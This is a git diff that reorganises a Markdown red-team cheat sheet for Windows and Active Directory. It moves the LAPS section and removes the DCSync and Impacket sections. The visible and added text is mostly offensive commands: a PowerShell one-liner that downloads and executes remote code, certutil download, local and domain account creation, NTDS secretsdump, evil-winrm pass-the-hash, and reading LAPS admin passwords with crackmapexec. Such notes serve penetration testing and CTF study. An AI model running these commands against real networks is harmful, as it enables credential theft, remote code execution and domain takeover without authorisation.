@@ -1,6 +1,5 @@
 # Commands
 ## User related
-### User and group info
 ```powershell
 # User info
 whoami /all
@@ -16,10 +15,7 @@ net localgroup <groupname>
 
 # Add user to group
 net group <groupname> /add <username>
-```
 
-### Account creation
-```powershell
 # Create account
 net user <username> <password> /add
 
@@ -30,21 +26,18 @@ net user <username> <password> /add /domain
 
 ## Basic
 ### System
-```bash
+```powershell
 # Shows info about system
 # Look whether HotFixes are applied or not
 systeminfo
-```
-### Show drives
-```powershell
+
+# Show drives
 powershell -c get-psdrive -psprovider filesystem
-```
-### Show hidden data streams
-```powershell
+
+# Show hidden data streams
 dir /R
-```
-### Download and execute files
-```powershell
+
+# Download and execute files
 iex(new-object net.webclient).downloadstring('remote_file')
 ```
 ### Download files
@@ -63,7 +56,7 @@ Start-BitsTransfer -Source <url> -Destination <output_file>
 certutil -urlcache -f <url> output_file<>
 ```
 
-### PowerView
+## PowerView
 **Make credentials**
 ```powershell
 # Set password
@@ -183,12 +176,6 @@ secretsdump.py -system <system_hive> -ntds <database_file> LOCAL
 ### Scripts needed
 - [https://github.com/k4sth4/SeBackupPrivilege](https://github.com/k4sth4/SeBackupPrivilege)
 
-#### References
-- [https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#Backup-Operators](https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#Backup-Operators)
-- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators-1](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators-1)
-- [https://blog.netwrix.com/2021/11/30/extracting-password-hashes-from-the-ntds-dit-file/](https://blog.netwrix.com/2021/11/30/extracting-password-hashes-from-the-ntds-dit-file/)
-- [https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277](https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277)
-
 
 # Active Directory
 ## BloodHound and SharpHound
@@ -228,49 +215,46 @@ evil-winrm -i <ip> -u <user> -H <hash>
 evil-winrm -i <ip> -S -k <private_key> -c <certificate>
 ```
 
+## LAPS
+LAPS allows you to manage the local Administrator password (which is randomised, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES       
+
+When using LAPS, 2 new attributes appear in the computer objects of the domain: ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime. These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes.
+
+### Commands
+```powershell
+# Check if LAPS is activated
+reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
+
+dir "C:\Program Files\LAPS\CSE"
+
+# Get commands available
+Get-Command *AdmPwd*
+
+# List who can read LAPS password of the given OU
+Find-AdmPwdExtendedRights -Identity Workstations | fl
+
+# Read the password
+Get-AdmPwdPassword -ComputerName wkstn-2 | fl
+```
+
+### Dumping credentials via crackmapexec
+```bash
+# LDAP
+crackmapexec ldap <ip> -u <user> -p <password> -d <domain> -M laps
+
+# SMB
+crackmapexec smb <ip> -u <user> -p <password> --laps
+```
+
+#### References
+- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)
+- [https://www.crackmapexec.wiki/smb-protocol/defeating-laps](https://www.crackmapexec.wiki/smb-protocol/defeating-laps)
+- [https://www.infosecmatter.com/crackmapexec-module-library/?cmem=ldap-laps](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=ldap-laps)s
+
 #### References
 - [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
 - [https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)
 
-
-## Impacket tools
-### secretsdump.py
-Helps to enumerate and dump AD hashes
-
-#### References & link to the tool
-- [https://github.com/fortra/impacket/blob/master/examples/secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
-- [https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
-
-### wmiexec.py
-Wmi allows to open process in hosts where you know the  username/(password/Hash).     
-Then, Wmiexec uses wmi to execute each command that is asked to execute
-```bash
-wmiexec.py 'domain/username:password@ip'
-```
-
-#### Reference
-- [https://book.hacktricks.xyz/windows-hardening/lateral-movement/wmicexec](https://book.hacktricks.xyz/windows-hardening/lateral-movement/wmicexec)
-
-## Misconfigurations
-### DCSync
-DCSync is a technique used to extract credentials from the Domain Controllers.    
-In this we mimic a Domain Controller and leverage the (MS-DRSR) protocol and request for replication using GetNCChanges function.
-
-#### Add rights DCSync rights
-```powershell
-# Set password
-$SecPassword = ConvertTo-SecureString <password> -AsPlainText -Force
-
-# Convert password and username into credentials object
-$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword) 
-
-# Give user DCSync rights
-Add-ObjectAcl -Credential $Cred -TargetIdentity "dc=domain,dc=local" -PrincipalIdentity <user> -Rights DCSync
-```
-#### Get hashes (after user is added to the group)
-```bash
-secretsdump.py  dc.local/<user>:<password>@<ipaddress> -outputfile hashes
-```
 
 # accesschk.exe
 AccessChk is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more. This tool will be helpful to identify whether the current user can modify files within a certain service directory.      
@@ -349,43 +333,6 @@ Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Iden
 - [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-7.0](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-7.0)
 
 
-# LAPS
-LAPS allows you to manage the local Administrator password (which is randomised, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES       
-
-When using LAPS, 2 new attributes appear in the computer objects of the domain: ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime. These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes.
-
-## Commands
-```powershell
-# Check if LAPS is activated
-reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
-
-dir "C:\Program Files\LAPS\CSE"
-
-# Get commands available
-Get-Command *AdmPwd*
-
-# List who can read LAPS password of the given OU
-Find-AdmPwdExtendedRights -Identity Workstations | fl
-
-# Read the password
-Get-AdmPwdPassword -ComputerName wkstn-2 | fl
-```
-
-## Dumping credentials via crackmapexec
-```bash
-# LDAP
-crackmapexec ldap <ip> -u <user> -p <password> -d <domain> -M laps
-
-# SMB
-crackmapexec smb <ip> -u <user> -p <password> --laps
-```
-
-### References
-- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)
-- [https://www.crackmapexec.wiki/smb-protocol/defeating-laps](https://www.crackmapexec.wiki/smb-protocol/defeating-laps)
-- [https://www.infosecmatter.com/crackmapexec-module-library/?cmem=ldap-laps](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=ldap-laps)
-
-
 # Mount windows shares and VHD files
 The Common Internet File System (CIFS) is a network file-sharing protocol. CIFS is a form of SMB.    
 ```bash
@@ -415,10 +362,6 @@ echo -n <string> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660
 - [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)
 - [https://github.com/billchaison/VNCDecrypt](https://github.com/billchaison/VNCDecrypt)
 
-# Exploits
-## Window-Exploit-Suggester
-This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.
-[https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 
 # Softwares / Processes
 ## LSASS process
